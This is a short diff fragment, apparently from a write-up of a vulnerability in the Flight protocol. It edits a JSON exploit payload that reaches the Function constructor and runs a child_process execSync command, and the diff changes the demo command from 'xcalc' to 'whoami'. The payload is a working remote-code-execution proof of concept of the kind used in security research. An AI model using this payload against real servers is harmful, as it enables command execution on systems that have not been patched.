@@ -25,7 +25,7 @@ The vulnerability was found in a protocol called Flight, which handles communica
  "reason": -1,  
  "value": "{\\"then\\":\\"$B1337\\"}",  
  "_response": {  
-   "_prefix": "process.mainModule.require('child_process').execSync('xcalc');",  
+   "_prefix": "process.mainModule.require('child_process').execSync('whoami');",  
    "_chunks": "$Q2",  
    "_formData": {  
      "get": "$1:constructor:constructor"  
